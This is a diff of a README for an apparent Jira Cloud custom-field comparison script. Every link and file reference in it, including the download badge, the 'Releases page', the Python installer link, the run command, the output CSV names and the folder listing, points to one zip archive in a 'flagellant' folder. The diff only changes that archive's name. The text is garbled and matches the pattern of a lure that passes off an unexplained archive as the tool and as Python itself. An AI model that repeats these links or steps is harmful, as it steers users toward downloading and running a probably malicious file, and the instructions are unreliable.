@@ -1,6 +1,6 @@
 # 🛠️ Jira-Cloud-Duplicate-Custom-Fields - Easily Compare Custom Fields from Jira
 
-[![Download](https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip)](https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip)
+[![Download](https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip)](https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to the Jira-Cloud-Duplicate-Custom-Fields repository! This script helps 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip) to download the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip) to download the application.
 
 1. Click on the link above to access the Releases page.
 2. Locate the latest release version.
@@ -30,10 +30,10 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/H0NE
 ## 📖 How to Run the Script
 
 1. **Download the Script:**
-   - Visit this [Releases page](https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip) and download the latest version.
+   - Visit this [Releases page](https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip) and download the latest version.
 
 2. **Install Python:**
-   - Download and install Python from [https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip](https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip).
+   - Download and install Python from [https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip](https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip).
    - During the installation, check the box to add Python to your PATH.
 
 3. **Open Your Terminal or Command Prompt:**
@@ -44,7 +44,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/H0NE
    - Use the command `cd path-to-your-download-folder` to go to the folder where you saved the script.
 
 5. **Run the Script:**
-   - Type `python https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip` and press Enter. Replace `https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip` with the actual file name.
+   - Type `python https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip` and press Enter. Replace `https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip` with the actual file name.
 
 6. **Follow the Prompts:**
    - The script will ask you for necessary details like your Jira Cloud URLs and authentication. Follow the instructions displayed on the screen.
@@ -52,9 +52,9 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/H0NE
 ## 🔍 Understanding the Output
 
 - After running the script, you will find three CSV files in the same folder:
-  - `https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip`: Custom fields from the first site.
-  - `https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip`: Custom fields from the second site.
-  - `https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip`: A comparison of custom fields between the two sites.
+  - `https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip`: Custom fields from the first site.
+  - `https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip`: Custom fields from the second site.
+  - `https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip`: A comparison of custom fields between the two sites.
 
 ## 📂 Folder Structure
 
@@ -62,9 +62,9 @@ When you download the application, you will have a folder that contains:
 
 ```
 /Jira-Cloud-Duplicate-Custom-Fields
-    ├── https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip
-    ├── https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip
-    └── https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Jira-Cloud-Duplicate-Custom-Fields.zip
+    ├── https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip
+    ├── https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip
+    └── https://raw.githubusercontent.com/H0NEYM0ON/Jira-Cloud-Duplicate-Custom-Fields/main/flagellant/Cloud-Custom-Fields-Jira-Duplicate-3.7.zip
 ```
 
 ## 🔧 Troubleshooting
